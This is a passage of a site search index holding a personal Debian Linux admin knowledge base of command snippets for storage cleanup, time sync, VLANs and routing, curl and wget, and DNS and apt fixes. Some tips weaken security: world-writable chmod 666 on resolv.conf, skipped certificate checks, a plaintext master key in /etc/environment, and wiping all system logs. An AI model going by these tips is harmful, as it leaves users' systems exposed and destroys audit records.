file_name\nupdatedb\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/","title":"Linux Clearing Storage","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#df-autoclean-logs","title":"df, autoclean &amp; logs","text":"<pre><code>df -h\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#clear-log-files-one-liner","title":"Clear log files - one liner","text":"<pre><code>sudo truncate -s 0 /var/log/*log\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#truncate-files-using-loop","title":"Truncate files using loop","text":"<p>you can create .sh file and chmod +x and insert the below into it</p> <pre><code>for logfile in $(ls /var/log/*.log)\ndo \ntruncate -s 0 $logfile\ndone\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#check-space-after-deletion","title":"Check space after deletion","text":"<pre><code>df -h\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#clean-and-du-with-max-depth","title":"clean and du with max depth","text":"<pre><code>sudo du -h --max-depth=1 | sort -h\nrm -rf ~/.cache/thumbnails/*\nsudo apt-get autoclean\nsudo apt-get clean\nsudo apt-get autoremove\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#purging-a-package","title":"purging a package","text":"<p>Fill in package name to purge</p> <pre><code>sudo apt-get remove --purge &lt;PACKAGENAME&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_Clearing_Storage/#popularity-contest","title":"Popularity Contest","text":"<p>popularity-contest</p> <pre><code>sudo apt install popularity-contest\ncd /var/log\nsudo touch popularity-contest\nsudo chmod 666 popularity-contest\nsudo popularity-contest &gt; /var/log/popularity-contest\npopcon-largest-unused\n</code></pre> <p>Now you can delete packages that are big in size and unused</p> <pre><code>sudo apt-get remove --purge &lt;PACKAGENAME&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/","title":"Linux date time","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/#change-your-timezone-you-can-use","title":"Change your timezone you can use","text":"<pre><code>sudo dpkg-reconfigure tzdata\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/#update-the-time-and-date-from-the-internet","title":"Update the time and date from the internet","text":"<pre><code>timedatectl set-ntp true\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/#alternative-ntp","title":"Alternative NTP","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/#install","title":"Install","text":"<p>If\u00a0<code>ntpd</code>\u00a0is not installed use one of the following command to install\u00a0<code>ntpd</code></p> <pre><code>sudo apt-get install ntp\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/#configuration","title":"Configuration","text":"<p>You should at least set following parameter in\u00a0<code>/etc/ntp.conf</code>\u00a0config file</p> <pre><code>server &lt;Time Server Name or IP Address&gt;\n</code></pre> <p>For example, open\u00a0<code>/etc/ntp.conf</code>\u00a0file using vi text editor</p> <pre><code>vi /etc/ntp.conf\n</code></pre> <p>Locate server parameter and set it as follows</p> <pre><code>server pool.ntp.org\n</code></pre> <p>Save the file and restart the\u00a0<code>ntpd</code>\u00a0service</p> <pre><code>/etc/init.d/ntpd start\n</code></pre> <p>You can synchronize the system clock to an NTP server immediately with following command</p> <pre><code>ntpdate pool.ntp.org\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Linux_date_time/#manually-setting-the-date","title":"Manually setting the date","text":"<p>For setting the time and date manually use the following syntax</p> <pre><code>date --set=\"STRING\"\n</code></pre> <p>For example, to set the date to\u00a0<code>2 Oct 2006 18:00:00</code>, type the following command as root user</p> <pre><code>date -s \"2 OCT 2006 18:00:00\"\n</code></pre> <p>OR</p> <pre><code>date --set=\"2 OCT 2006 18:00:00\"\n</code></pre> <p>You can also simplify format using following syntax</p> <pre><code>date +%Y%m%d -s \"20081128\"\n</code></pre> <p>To set time use the following syntax</p> <pre><code>date +%T -s \"10:13:13\"\n</code></pre> <p>where:</p> <ul> <li><code>10</code>: Hour (hh)</li> <li><code>13</code>: Minute (mm)</li> <li><code>13</code>: Second (ss)</li> </ul> <p>You can use\u00a0<code>%p</code>\u00a0for the locale's equivalent of AM/PM</p> <pre><code>date +%T%p -s \"6:10:30AM\"\ndate +%T%p -s \"12:10:30PM\"\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/","title":"Networking VLAN and Route","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#system-os-timed-reboot","title":"system os timed reboot","text":"<pre><code>#IN 10 Minutes\nsudo shutdown -r +10\n\n#AT o'clock\nsudo shutdown \u2013r 16:15\n\n#Cancel\nshutdown -c\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#restart-network-service","title":"restart network service","text":"<p>TO RESTART - NEW WAY</p> <pre><code>sudo systemctl restart NetworkManager\n</code></pre> <p>TO RESTART - OLD WAY</p> <pre><code>sudo service network-manager restart\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#checking-network-status","title":"Checking network status","text":"<pre><code>systemctl status network-manager\n</code></pre> <p>result example</p> <pre><code>NetworkManager.service - Network Manager\nLoaded: loaded (/lib/systemd/system/NetworkManager.service; enabled; vendor preset: enabled)\nActive: active (running) since Sat 2022-12-31 14:04:46 UTC; 16h ago\nDocs: man:NetworkManager(8)\nMain PID: 3102 (NetworkManager)\nTasks: 3 (limit: 3831)\nMemory: 12.9M\nCGroup: /system.slice/NetworkManager.service\n\u2514\u25003102 /usr/sbin/NetworkManager --no-daemon\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#network-configuration-files-locations","title":"Network configuration files locations","text":"<pre><code>sudo nano /etc/NetworkManager/NetworkManager.conf\nsudo nano /etc/network/interfaces\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#using-vlan","title":"Using VLAN","text":"<p>setting up VLANs</p> <pre><code>sudo apt install -y vlan\nmodprobe 8021q\n\n**if VLANx**\nsudo ifconfig up VLANx\nsudo dhclient VLANx\n\n**if eth0.x**\n#sudo vconfig add eth0 x\nsudo ifconfig up eth0.x\nsudo dhclient eth0.x\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#nmcli","title":"nmcli","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#nmcli-installation","title":"nmcli installation","text":"<pre><code>sudo apt-get install -y network-manager\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#show-general-status","title":"show general status","text":"<pre><code>nmcli general status\n\nSTATE      CONNECTIVITY  WIFI-HW  WIFI     WWAN-HW  WWAN\nconnected  full          enabled  enabled  enabled  enabled\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#show-device-status","title":"show device status","text":"<pre><code>nmcli dev status\n\nDEVICE    TYPE      STATE      CONNECTION\neth0      ethernet  connected  Wired connection 1\nVLAN50  vlan      connected  vlan-VLAN50\nlo        loopback  unmanaged  --\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#show-ip-link","title":"show ip link","text":"<pre><code>ip link show\n</code></pre> <pre><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\nlink/ether 00:11:22:48:b2:17 brd ff:ff:ff:ff:ff:ff\n3: VLAN50@eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000\nlink/ether 00:11:22:48:b2:17 brd ff:ff:ff:ff:ff:ff\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#adding-a-wlan-adapter","title":"Adding a WLAN Adapter","text":"<p>Need to add a WLAN adapter? Connect it to an open USB port on the device</p> <pre><code>Sudo ifconfig\nwlan0 Link encap:Ethernet HWaddr 05:06:07:f3:9a:17 UP BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:222 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)\n\nsudo iwconfig wlan0 essid \"WLAN_NAME\"\nsudo dhclient wlan0\nsudo ifconfig wlan0 up\nifconfig wlan0\n\nnmcli dev status\nnmcli radio wifi\nnmcli radio wifi on\nnmcli dev wifi list\nsudo nmcli dev wifi connect network-ssid\nsudo nmcli dev wifi connect network-ssid password \"network-password\"\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#using-different-connections","title":"using different connections","text":"<p>If you're connected to one network, but want to use a different connection, you can disconnect by switching the connection to down. You'll need to specify the SSID, or if you have multiple connections with the same SSID, use the UUID.</p> <pre><code>nmcli con down ssid/uuid\n</code></pre> <p>To connect to another saved connection, simply pass the up option in the nmcli command. Make sure that you specify the SSID or UUID of the new network that you want to connect to.</p> <pre><code>nmcli con up ssid/uuid\n\nwlan0 Link encap:Ethernet HWaddr 05:06:07:f3:9a:17 inet addr:192.168.20.85 Bcast:192.168.23.255 Mask:255.255.252.0\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#show-nmcli-connections","title":"show nmcli connections","text":"<pre><code>nmcli con show\n#To show active only use switch -a    $ nmcli con -a&gt;\n</code></pre> <p>example</p> <pre><code>NAME                UUID                                  TYPE      DEVICE\nWired connection 1  96a930f1-7119-3f77-a0e9-76356a82cceb  ethernet  eth0\nvlan-VLAN50       c5e76778-76fc-49f9-bbb5-cff1a55e0704  vlan     VLAN50\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#nmcli-modify-connection","title":"nmcli modify connection","text":"<pre><code>sudo nmcli con modify VLAN50 802-3-ethernet.cloned-mac-address 00:11:22:37:71:39\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#nmcli-add-connection","title":"nmcli add connection","text":"<pre><code>sudo nmcli con add type vlan ifname VLAN50 dev eth0 id 50\nsudo nmcli con up VLAN50\nsudo nmcli con up vlan-VLAN50\n\nsudo nmcli con add type vlan ifname VLAN200 dev eth0 id 1000\nsudo nmcli con up VLAN200\nsudo nmcli con up vlan-VLAN200\n\nYou will see it in green instead of Orange once you run nmcli con show again\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#nmcli-delete","title":"nmcli Delete","text":"<pre><code>#Get &lt;NAME&gt; field value\nnmcli connection show\n#Delete for &lt;NAME&gt;\nsudo nmcli connection delete id &lt;NAME&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#setting-a-dev-as-managed","title":"Setting a dev as managed","text":"<pre><code>sudo nmcli dev set vlan50 managed yes\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#route","title":"Route","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#show-route","title":"Show route","text":"<pre><code>route -n\n\nKernel IP routing table    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         10.30.30.1      0.0.0.0         UG    0      0        0 eth0\n0.0.0.0         10.20.20.1      0.0.0.0         UG    300    0        0 eth0.35\n10.5.0.0        10.10.10.1      0.0.0.0         UG    0      0        0 vlan50\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#route-delete","title":"Route DELETE","text":"<pre><code>sudo route del -net 0.0.0.0 gw 10.30.30.1 netmask 0.0.0.0 dev eth0\nsudo route del -net 0.0.0.0 gw 10.20.20.1 netmask 0.0.0.0 dev eth0.35\nsudo route del -net 0.0.0.0 gw 10.10.10.1 dev vlan50\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#route-add","title":"Route ADD","text":"<p>dev syntax depends on how you have those devices set up. You can check by using 'nmcli conn show'</p> <pre><code>sudo route add -net 0.0.0.0 gw 172.20.0.1 dev VLAN50\nsudo route add -net 0.0.0.0 gw 172.20.0.1 dev eth0.50\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#check-route","title":"Check Route","text":"<p>Keep in mind that you will loose access if the Route looks like this, you need to wait for your routes to fully populate, might take a bit so keep checking</p> <pre><code>route -n\n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         10.20.20.254  0.0.0.0         UG    100    0        0 eth0\n0.0.0.0         172.20.0.1      0.0.0.0         UG    400    0        0 VLAN50\n10.20.20.128  0.0.0.0         255.255.255.128 U     100    0        0 eth0\n169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 VLAN50\n172.20.0.0      0.0.0.0         255.255.240.0   U     400    0        0 VLAN50\n</code></pre> <p>Table should look like this. If you want to delete the eth0 default route so you can force all traffic on a VLAN, you will lose connectivity to the device. In most cases you can regain access if you bounce the Switch port the device is connected to (Disable &gt; wait a few seconds &gt; Enable).</p> <pre><code>route -n\n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         10.50.115.20  0.0.0.0         UG    0      0        0 eth0\n0.0.0.0         10.50.115.20  0.0.0.0         UG    100    0        0 eth0\n0.0.0.0         172.20.0.1      0.0.0.0         UG    400    0        0 VLAN50\n10.20.20.0        10.50.115.20  255.255.0.0     UG    0      0        0 eth0\n10.50.20.128  0.0.0.0         255.255.255.128 U     100    0        0 eth0\n20.128.20.192  10.50.115.20  255.255.255.240 UG    0      0        0 eth0\n66.20.20.32   10.50.115.20  255.255.255.224 UG    0      0        0 eth0\n20.195.20.20  10.50.115.20  255.255.255.240 UG    0      0        0 eth0\n20.45.20.192   10.50.115.20  255.255.255.224 UG    0      0        0 eth0\n169.20.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 VLAN50\n172.20.0.0      0.0.0.0         255.255.240.0   U     400    0        0 VLAN50\n20.20.47.32   10.50.115.20  255.255.255.240 UG    0      0        0 eth0\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#netplan","title":"Netplan","text":"<ul> <li>Resources</li> <li>https://tom-henderson.github.io/2019/04/12/ubuntu-vlan-config.html</li> <li>https://netplan.io/examples</li> </ul> <pre><code>sudo apt update\nsudo apt install [netplan.io](&lt;http://netplan.io/&gt;)\nreboot\n\ncd /etc/netplan/\nsudo nano 01-netplan-config.yaml\n\nnetwork:\n    renderer: networkd\n        ethernets:\n            eth0:\n            dhcp4: true\n            vlans:\n                vlan50:\n                    id: 50\n                    link: eth0\n                    addresses: [172.20.100.1/22]\n\nnetwork:\n    ethernets:\n        eth0:\n            dhcp4: false\n            addresses:\n                - 10.10.10.2/24\n            gateway4: 10.10.10.1\n            nameservers:\n                search: [mydomain, otherdomain]\n                addresses: [10.10.10.1, 1.1.1.1]\n            vlans:\n                vlan50:\n                    id: 50\n                    link: eth0\n                    addresses: [172.20.100.1/22]\n\n#To test the file run below\nsudo netplan generate &lt;filename&gt;.yaml\n\n#To try the config file\nsudo netplan try &lt;filename&gt;.yaml\n\n#while in /etc/netplan/\nsudo netplan apply\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Networking_VLAN_and_Route/#extra-commands","title":"extra commands","text":"<pre><code>cat /proc/net/route\nip route\nip route get x.x.x.x\nip route show table local\n#policy-based routing\nip rule show\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/SSL_Cert_end_date_check/","title":"SSL Cert end date check","text":"<p>Linux Bash script to check directoy file * PEM and will print cert end date</p> <pre><code>for pem in /etc/ssl/certs/*.pem; do\nprintf '%s: %s\\\\n' \\\\\n\"$(date --date=\"$(openssl x509 -enddate -noout -in \"$pem\"|cut -d= -f 2)\" --iso-8601)\" \\\\\n\"$pem\"\ndone | sort\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/System_Commands/","title":"System Commands","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/System_Commands/#system-os-timed-reboot","title":"System OS timed reboot","text":"<pre><code>#IN 10 Minutes\nsudo shutdown -r +10\n\n#AT o'clock\nsudo shutdown \u2013r 16:15\n\n#Cancel\nshutdown -c\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/System_Commands/#enabling-ssh","title":"enabling SSH","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/System_Commands/#installing-ssh","title":"installing SSH","text":"<pre><code>sudo\u00a0apt\u00a0install\u00a0openssh-server\u00a0-y\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/System_Commands/#check-service-status","title":"check service status","text":"<pre><code>sudo\u00a0systemctl status\u00a0ssh\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/System_Commands/#ufw","title":"ufw","text":"<p>If you have ufw enabled, allow the connection on the SSH port by using the ufw command</p> <pre><code>sudo\u00a0ufw allow\u00a0ssh\n</code></pre> <p></p> <p>enable and reload the ufw</p> <pre><code>sudo\u00a0ufw\u00a0enable\u00a0&amp;&amp;\u00a0sudo\u00a0ufw reload\n</code></pre> <p></p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/","title":"curl","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#curl-version","title":"curl Version","text":"<pre><code>curl -V          \ncurl --version\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#download","title":"Download","text":"<p>The 'curl -O' option will save the file name the same as in the URL only The 'curl -o' option can choose a different name to save the output file</p> <pre><code>curl -O https://xxxx/xxx.gz\ncurl -o zzz.gz https://zzz/zzz.gz\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#download-multiple-files","title":"Download multiple files","text":"<pre><code>curl -O https://xxxx/xxxx.gz -O https://xxxx/xxxx.gz\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#continue-from-inturrupted-download","title":"Continue from inturrupted download","text":"<pre><code>curl -C - -O https://xxxxx/xxxxx.gz\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#download-from-ftp-sftp","title":"Download from FTP &amp; SFTP","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#normal-ftp","title":"Normal FTP","text":"<pre><code>curl -u FTP_UserName:FTP_Password -O ftp://xxx/README.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#for-sftp","title":"For SFTP","text":"<pre><code>curl -u SFTP_UserName:SFTP_Password -O -k sftp://xxx/README.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#upload-file-ftp-sftp","title":"Upload file FTP &amp; SFTP","text":"<pre><code>-T flag represents the upload file.\n-k flag used in SFTP explicitly allows curl to perform \"insecure\" SSL connections and transfers.\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#normal-ftp_1","title":"Normal FTP","text":"<pre><code>curl -u FTP_UserName:FTP_Password -T linuxteck.sql.gz ftp://linuxteck.com\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#for-sftp_1","title":"For SFTP","text":"<pre><code>curl -u SFTP_UserName:SFTP_Password -T -k sftp://linuxteck.com/README.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#delete-file-from-ftp","title":"Delete file from FTP","text":"<pre><code>curl ftp://xxxxx -X 'DELE xxxx.gz' -u FTP_UserName:FTP_Password\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/curl/#transfer-using-proxy","title":"Transfer using proxy","text":"<pre><code>curl -x proxy.example.com:3128 -O https://xxxx/abc.html\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/environment_keys/","title":"environment keys","text":"<pre><code>sudo nano /etc/environment\n</code></pre> <p>Replace with the following, use your key</p> <pre><code>ENCRYPTION_MASTER_KEY_BLAHBS=@X7g7OiLtQ!4Ag%Cs1kFF@LPbFx%IrHm19y48OUw2HO*l\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/wget/","title":"wget","text":"<p>Downloading a file using a specific user agent</p> <pre><code>wget --user-agent=\" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\" https://www.website.com/\n\n--no-check-certificate\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Desktop_Environment/dekstop_environment/","title":"Desktop Environment","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Desktop_Environment/dekstop_environment/#resources","title":"Resources","text":"<ul> <li>lxqt-on-linux</li> </ul>"},{"location":"Knowledge_Base/OS/Linux/Debian/Desktop_Environment/dekstop_environment/#lxqt-on-linux","title":"LXQt on Linux","text":"<p>This package contains LXQt and various programs, apps, and a login session so you can use the desktop.</p> <pre><code>sudo apt install lubuntu-desktop\n</code></pre> <p>To start the installation of LXQt on Debian</p> <pre><code>sudo apt install lxqt\n</code></pre> <p>choose lightdm</p> <p></p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/","title":"FIX DNS resolv.conf","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#method-1-recommended","title":"METHOD 1 - Recommended","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#run-auto-clean","title":"run auto-clean","text":"<pre><code>sudo apt-get auto-clean\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#fix-file-permission","title":"fix file permission","text":"<pre><code>cd /etc\nls -al | grep resol\ndrwxr-xr-x   5 root root     4096 Apr  9  2020 resolvconf\nlrwxrwxrwx   1 root root       29 Jan 22  2016 resolv.conf -&gt; ../run/resolvconf/resolv.conf\n\nsudo chmod 666 resolv.conf\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#check-networkmanagerconf","title":"Check NetworkManager.conf","text":"<pre><code>sudo nano /etc/NetworkManager/NetworkManager.conf\n</code></pre> <p>in main make sure dns is set to dhcp OR you can comment dns all together</p> <pre><code>[main]\ndns=dhcp\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#resolvconf","title":"resolv.conf","text":"<ul> <li>This will tell the system to use the resolvconf service to automatically obtain the DNS server IPs.</li> <li>It is also worth noting that, depending on your Linux distribution, the resolv.conf file may be a symbolic link to a file managed by the system, which is automatically updated with DNS server IPs obtained from DHCP. In this case, it's not necessary to make any changes to the resolv.conf file.</li> </ul> <pre><code>sudo nano /etc/resolv.conf\n</code></pre> <p>Replace the file content with the below</p> <pre><code># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# This file is managed by man:systemd-resolved(8). Do not edit.\n#\n# This is a dynamic resolv.conf file for connecting local clients to the\n# internal DNS stub resolver of systemd-resolved. This file lists all\n# configured search domains.\n#\n# Run \"resolvectl status\" to see details about the uplink DNS servers\n# currently in use.\n#\n# Third party programs must not access this file directly, but only through the\n# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,\n# replace this symlink by a static file or a different symlink.\n#\n# See man:systemd-resolved.service(8) for details about the supported modes of\n# operation for /etc/resolv.conf.\n\nnameserver 127.0.0.53\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#restarting-the-network-service","title":"restarting the network service","text":"<p>TO RESTART - NEW WAY</p> <pre><code>sudo systemctl restart NetworkManager\n</code></pre> <p>TO RESTART - OLD WAY</p> <pre><code>sudo service network-manager restart\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#method-2","title":"method 2","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#add-the-resolved-domains-manually-to-etchosts-with-this-short-script","title":"Add the resolved domains manually to\u00a0/etc/hosts\u00a0with this short script","text":"<pre><code>resolveAptHosts()\n{\n    mapfile -t hosts &lt; &lt;(\n        sed -n -r '/^#/d; s;deb(-src)? (http://|ftp://)?([^/ ]+).*;\\3;p'\\\n        /etc/apt/sources.list | sort | uniq )\n    # delete all hosts from /etc/hosts, e.g., from an earlier call\n    sudo sed -i -r '/^[0-9]{1,3}(\\.[0-9]{1,3}){3}[ \\t]+('\"$( printf '|%s'\\\n        \"${hosts[@]//./\\\\.}\" | sed 's/^|//' )\"')[ \\t]*$/d' /etc/hosts\n    for host in ${hosts[@]}; do\n        ip=$( nslookup \"$host\" | sed -n -r 's|Address:[ \\t]*([0-9.]+).*|\\1|p' |\n            tail -1 )\n        sudo bash -c \"echo $ip $host &gt;&gt; /etc/hosts\"\n    done\n}\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#update","title":"update","text":"<pre><code>resolveAptHosts &amp;&amp; sudo apt-get update\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#method-3","title":"method 3","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#check-dns","title":"Check DNS","text":"<pre><code>nmcli con show \"Wired connection 1\" | grep ipv4.dns\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#change-your-dns","title":"Change your DNS","text":"<pre><code>sudo nmcli conn modify \"Wired connection 1\" ipv4.ignore-auto-dns yes\nsudo nmcli conn modify \"Wired connection 1\" ipv4.dns  \"192.168.24.7 8.8.8.8\"\nsudo systemctl restart NetworkManager\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_DNS_resolv.conf/#check-if-your-host-is-being-resolved","title":"Check if your host is being resolved","text":"<pre><code>nslookup google.com\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Could_not_get_lock_Resource_temporarily_unavailable/","title":"FIX Linux Could not get lock Resource temporarily unavailable","text":"<p>If you are receiving the following error message, follow the steps below.</p> <p></p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Could_not_get_lock_Resource_temporarily_unavailable/#1-check-for-running-processes","title":"#1: Check for Running Processes","text":"<pre><code>ps aux | grep -i apt\nps aux | grep -i dpkg\n</code></pre> <p>You could terminate the process using</p> <pre><code>sudo kill &lt;PID&gt;\n# from above picture PID is second col from left. PID is 7991 and 7993 [Yours will be different]\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Could_not_get_lock_Resource_temporarily_unavailable/#2-remove-lock-files-manually","title":"#2: Remove Lock Files Manually","text":"<p>Run the below commands and then attempt to run <code>sudo apt update</code></p> <pre><code>sudo rm /var/lib/apt/lists/lock\nsudo rm /var/cache/apt/archives/lock\nsudo rm /var/lib/dpkg/lock\nsudo rm /var/lib/dpkg/lock-frontend\n</code></pre> <p>Above should solve the problem, but if doesn't, run <code>sudo dpkg --configure -a</code> then try to <code>sudo apt update</code></p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Ubuntu_update_error_waiting_for_unattended-upgrade_to_exit/","title":"FIX Linux Ubuntu update error waiting for unattended-upgrade to exit","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Ubuntu_update_error_waiting_for_unattended-upgrade_to_exit/#stop-the-automatic-updater","title":"Stop the automatic updater","text":"<p>choose not to download and install updates</p> <pre><code>sudo dpkg-reconfigure -plow unattended-upgrades\n\nreboot.\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Ubuntu_update_error_waiting_for_unattended-upgrade_to_exit/#make-sure-any-packages-in-an-unclean-state-are-installed-correctly","title":"Make sure any packages in an unclean state are installed correctly:","text":"<pre><code>sudo dpkg --configure -a\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Ubuntu_update_error_waiting_for_unattended-upgrade_to_exit/#get-your-system-up-to-date","title":"Get your system up-to-date:","text":"<pre><code>sudo apt update &amp;&amp; sudo apt -f install &amp;&amp; sudo apt 